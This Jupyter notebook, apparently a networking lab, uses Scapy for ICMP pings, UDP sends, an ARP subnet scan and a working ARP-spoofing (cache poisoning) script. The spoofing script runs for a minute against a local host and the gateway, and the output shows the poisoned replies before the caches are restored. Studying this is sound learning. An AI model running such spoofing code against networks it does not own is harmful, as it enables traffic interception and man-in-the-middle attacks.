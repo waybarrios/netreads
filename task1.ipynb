{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 89,
   "id": "7292ab9d-329d-44e1-a63b-e27691144e07",
   "metadata": {},
   "outputs": [],
   "source": [
    "from scapy.all import *\n",
    "import time "
   ]
  },
  {
   "cell_type": "markdown",
   "id": "facdce6e-0aec-4a6e-9089-26db9529e370",
   "metadata": {},
   "source": [
    "## **Send ICMP pings (TCP Protocol)**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "48a43efa-cd87-416b-b047-825a96713e37",
   "metadata": {},
   "outputs": [],
   "source": [
    "cloud_host = \"waybarrios.com\" \n",
    "host = \"192.168.1.64\""
   ]
  },
  {
   "cell_type": "markdown",
   "id": "150eb987-f5b3-4583-9b51-26355dcd85e0",
   "metadata": {},
   "source": [
    "### **Host in LocalNet**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "c0cd94e3-a05c-43e9-b730-c6b888434bd0",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Begin emission:\n",
      "Finished sending 1 packets.\n",
      ".*\n",
      "Received 2 packets, got 1 answers, remaining 0 packets\n",
      "0000 IP / ICMP 192.168.1.3 > 192.168.1.64 echo-request 0 ==> IP / ICMP 192.168.1.64 > 192.168.1.3 echo-reply 0\n",
      "Begin emission:\n",
      "Finished sending 1 packets.\n",
      "*\n",
      "Received 1 packets, got 1 answers, remaining 0 packets\n",
      "0000 IP / ICMP 192.168.1.3 > 192.168.1.64 echo-request 0 ==> IP / ICMP 192.168.1.64 > 192.168.1.3 echo-reply 0\n",
      "Begin emission:\n",
      "Finished sending 1 packets.\n",
      "*\n",
      "Received 1 packets, got 1 answers, remaining 0 packets\n",
      "0000 IP / ICMP 192.168.1.3 > 192.168.1.64 echo-request 0 ==> IP / ICMP 192.168.1.64 > 192.168.1.3 echo-reply 0\n",
      "Begin emission:\n",
      "Finished sending 1 packets.\n",
      "*\n",
      "Received 1 packets, got 1 answers, remaining 0 packets\n",
      "0000 IP / ICMP 192.168.1.3 > 192.168.1.64 echo-request 0 ==> IP / ICMP 192.168.1.64 > 192.168.1.3 echo-reply 0\n",
      "Begin emission:\n",
      "Finished sending 1 packets.\n",
      "\n",
      "Received 1 packets, got 1 answers, remaining 0 packets\n",
      "*0000 IP / ICMP 192.168.1.3 > 192.168.1.64 echo-request 0 ==> IP / ICMP 192.168.1.64 > 192.168.1.3 echo-reply 0\n"
     ]
    }
   ],
   "source": [
    "#sending 5 packets \n",
    "for _ in range(5):\n",
    "    ans, unans = sr(IP(dst=host)/ICMP(), timeout=2)\n",
    "    ans.show()\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "e7a55af0-81d6-42e9-8e28-6d010d4648c4",
   "metadata": {},
   "source": [
    "### **Host in Cloud**\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "701452c0-a714-4be7-b9b7-9bdac31fe38d",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Begin emission:\n",
      "Finished sending 1 packets.\n",
      ".*\n",
      "Received 2 packets, got 1 answers, remaining 0 packets\n",
      "0000 IP / ICMP 192.168.1.3 > 172.67.159.234 echo-request 0 ==> IP / ICMP 172.67.159.234 > 192.168.1.3 echo-reply 0 / Padding\n",
      "Begin emission:\n",
      "Finished sending 1 packets.\n",
      "*\n",
      "Received 1 packets, got 1 answers, remaining 0 packets\n",
      "0000 IP / ICMP 192.168.1.3 > 172.67.159.234 echo-request 0 ==> IP / ICMP 172.67.159.234 > 192.168.1.3 echo-reply 0 / Padding\n",
      "Begin emission:\n",
      "Finished sending 1 packets.\n",
      "*\n",
      "Received 1 packets, got 1 answers, remaining 0 packets\n",
      "0000 IP / ICMP 192.168.1.3 > 172.67.159.234 echo-request 0 ==> IP / ICMP 172.67.159.234 > 192.168.1.3 echo-reply 0 / Padding\n",
      "Begin emission:\n",
      "Finished sending 1 packets.\n",
      "*\n",
      "Received 1 packets, got 1 answers, remaining 0 packets\n",
      "0000 IP / ICMP 192.168.1.3 > 172.67.159.234 echo-request 0 ==> IP / ICMP 172.67.159.234 > 192.168.1.3 echo-reply 0 / Padding\n",
      "Begin emission:\n",
      "Finished sending 1 packets.\n",
      "*\n",
      "Received 1 packets, got 1 answers, remaining 0 packets\n",
      "0000 IP / ICMP 192.168.1.3 > 172.67.159.234 echo-request 0 ==> IP / ICMP 172.67.159.234 > 192.168.1.3 echo-reply 0 / Padding\n"
     ]
    }
   ],
   "source": [
    "#sending 5 packets \n",
    "for _ in range(5):\n",
    "    ans, unans = sr(IP(dst=cloud_host)/ICMP(), timeout=2)\n",
    "    ans.show()"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7106ffa9-3dc2-4469-8ac6-10d6d8be223c",
   "metadata": {},
   "source": [
    "## **Send UPD Packets**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 54,
   "id": "f01d669e-877d-406f-9d31-4bc84aa53724",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "\n",
      "Sent 1 packets..\n"
     ]
    }
   ],
   "source": [
    "ans = send(IP(dst=\"192.168.1.67\")/UDP(dport=10000)/Raw(load=\"hello world!\"))\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "d990adce-9f16-40bf-b08f-75e282a30fec",
   "metadata": {},
   "source": [
    "#### **Wireshark**\n",
    "\n",
    "![alt text](wireshark.png \"Wireshark\")\n",
    "\n",
    "#### **Server UDP app**\n",
    "\n",
    "**Server code:** \n",
    "```python \n",
    "import socket\n",
    "import sys\n",
    "\n",
    "# Create a UDP socket\n",
    "sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)\n",
    "\n",
    "# Bind the socket to the port\n",
    "server_address = ('localhost', 10000)\n",
    "print('starting up on {} port {}'.format(*server_address))\n",
    "sock.bind(server_address)\n",
    "\n",
    "while True:\n",
    "    print('\\nwaiting to receive message')\n",
    "    data, address = sock.recvfrom(4096)\n",
    "\n",
    "    print('received {} bytes from {}'.format(\n",
    "        len(data), address))\n",
    "    print(data)\n",
    "```\n",
    "**Command Output**\n",
    "![alt text](server.png \"Server Output\")\n"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "7a242901-401c-46d5-b2cc-50974cf8b4ab",
   "metadata": {},
   "source": [
    "## **ARP spoofing**"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 59,
   "id": "9188d96c-30f0-4e13-a214-f93cfadb7232",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000\n",
      "    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00\n",
      "    inet 127.0.0.1/8 scope host lo\n",
      "       valid_lft forever preferred_lft forever\n",
      "    inet6 ::1/128 scope host \n",
      "       valid_lft forever preferred_lft forever\n",
      "2: wlp0s20f3: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default qlen 1000\n",
      "    link/ether dc:1b:a1:9c:e7:94 brd ff:ff:ff:ff:ff:ff\n",
      "    inet 192.168.1.3/24 brd 192.168.1.255 scope global dynamic noprefixroute wlp0s20f3\n",
      "       valid_lft 85557sec preferred_lft 85557sec\n",
      "    inet6 fe80::88fd:98e7:a365:c0f1/64 scope link noprefixroute \n",
      "       valid_lft forever preferred_lft forever\n",
      "3: gpd0: <POINTOPOINT,MULTICAST,NOARP> mtu 1500 qdisc noop state DOWN group default qlen 500\n",
      "    link/none \n"
     ]
    }
   ],
   "source": [
    "!ip a"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 72,
   "id": "225921c1-25f6-4caf-83f4-5be47162defd",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Begin emission:\n",
      "Finished sending 256 packets.\n",
      "********.......\n",
      "Received 15 packets, got 8 answers, remaining 248 packets\n"
     ]
    }
   ],
   "source": [
    "#get mac address local-net\n",
    "ans, unans = srp(Ether(dst=\"ff:ff:ff:ff:ff:ff\")/ARP(pdst=\"192.168.1.0/24\"), timeout=2)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 73,
   "id": "f2202867-3f8c-41f0-b506-015d8c431dd8",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "MAC Addresses in the local net: \n",
      "cc:ed:dc:24:a5:80 192.168.1.1\n",
      "d8:31:34:d3:c4:5a 192.168.1.10\n",
      "80:1f:02:6f:72:4f 192.168.1.43\n",
      "80:78:71:1c:24:16 192.168.1.47\n",
      "70:18:8b:05:99:3b 192.168.1.64\n",
      "50:84:92:ff:50:14 192.168.1.67\n",
      "0c:cb:85:5d:90:61 192.168.1.9\n",
      "f4:0f:24:0a:76:32 192.168.1.253\n"
     ]
    }
   ],
   "source": [
    "#mac address \n",
    "print(\"MAC Addresses in the local net: \") \n",
    "ans.summary(lambda s,r: r.sprintf(\"%Ether.src% %ARP.psrc%\") )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 62,
   "id": "22fc6c8a-5981-4ef3-ad70-b607162db16e",
   "metadata": {},
   "outputs": [],
   "source": [
    "def get_mac(ip):\n",
    "    ans, _ = srp(Ether(dst='ff:ff:ff:ff:ff:ff')/ARP(pdst=ip), timeout=3, verbose=0)\n",
    "    if ans:\n",
    "        return ans[0][1].src"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 96,
   "id": "ce78dd84-39c1-480b-bd5c-0da300f68494",
   "metadata": {},
   "outputs": [],
   "source": [
    "def spoof(target_ip, host_ip, verbose=True):\n",
    "    \"\"\"\n",
    "    Spoofs `target_ip` saying that we are `host_ip`.\n",
    "    it is accomplished by changing the ARP cache of the target (poisoning)\n",
    "    \"\"\"\n",
    "    # get the mac address of the target\n",
    "    target_mac = get_mac(target_ip)\n",
    "    # craft the arp 'is-at' operation packet, in other words; an ARP response\n",
    "    # we don't specify 'hwsrc' (source MAC address)\n",
    "    # because by default, 'hwsrc' is the real MAC address of the sender (ours)\n",
    "    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, op='is-at')\n",
    "    # send the packet\n",
    "    # verbose = 0 means that we send the packet without printing any thing\n",
    "    send(arp_response, verbose=0)\n",
    "    if verbose:\n",
    "        # get the MAC address of the default interface we are using\n",
    "        self_mac = ARP().hwsrc\n",
    "        print(\"[INFO] Sent to {} : {} is-at {}\".format(target_ip, host_ip, self_mac))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 97,
   "id": "fdb6f8c2-b650-4b08-b4c7-c2b4f3157c64",
   "metadata": {},
   "outputs": [],
   "source": [
    "def restore(target_ip, host_ip, verbose=True):\n",
    "    \"\"\"\n",
    "    Restores the normal process of a regular network\n",
    "    This is done by sending the original informations \n",
    "    (real IP and MAC of `host_ip` ) to `target_ip`\n",
    "    \"\"\"\n",
    "    # get the real MAC address of target\n",
    "    target_mac = get_mac(target_ip)\n",
    "    # get the real MAC address of spoofed (gateway, i.e router)\n",
    "    host_mac = get_mac(host_ip)\n",
    "    # crafting the restoring packet\n",
    "    arp_response = ARP(pdst=target_ip, hwdst=target_mac, psrc=host_ip, hwsrc=host_mac, op=\"is-at\")\n",
    "    # sending the restoring packet\n",
    "    # to restore the network to its normal process\n",
    "    # we send each reply seven times for a good measure (count=7)\n",
    "    send(arp_response, verbose=0, count=7)\n",
    "    if verbose:\n",
    "        print(\"[INFO] Sent to {} : {} is-at {}\".format(target_ip, host_ip, host_mac))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 98,
   "id": "3bb67e62-cd57-4cae-a26b-99df51822d56",
   "metadata": {},
   "outputs": [],
   "source": [
    "target=\"192.168.1.67\"\n",
    "host = \"192.168.1.1\"\n",
    "verbose = True"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 99,
   "id": "9acfa075-6a0f-4164-8a66-11b9ed16afed",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at dc:1b:a1:9c:e7:94\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at dc:1b:a1:9c:e7:94\n",
      "[!!!] Restoring the network, please wait...\n",
      "[INFO] Sent to 192.168.1.67 : 192.168.1.1 is-at cc:ed:dc:24:a5:80\n",
      "[INFO] Sent to 192.168.1.1 : 192.168.1.67 is-at 50:84:92:ff:50:14\n"
     ]
    }
   ],
   "source": [
    "#_enable_linux_iproute()\n",
    "t_end = time.time() + 60 # wait a minue \n",
    "while time.time() < t_end:\n",
    "    # telling the `target` that we are the `host`\n",
    "    spoof(target, host, verbose)\n",
    "    # telling the `host` that we are the `target`\n",
    "    spoof(host, target, verbose)\n",
    "    # sleep for one second\n",
    "    time.sleep(1)\n",
    "\n",
    "print(\"[!!!] Restoring the network, please wait...\")\n",
    "restore(target, host)\n",
    "restore(host, target)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "dbf596f1-04f9-446e-b222-d4526c534080",
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.12"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
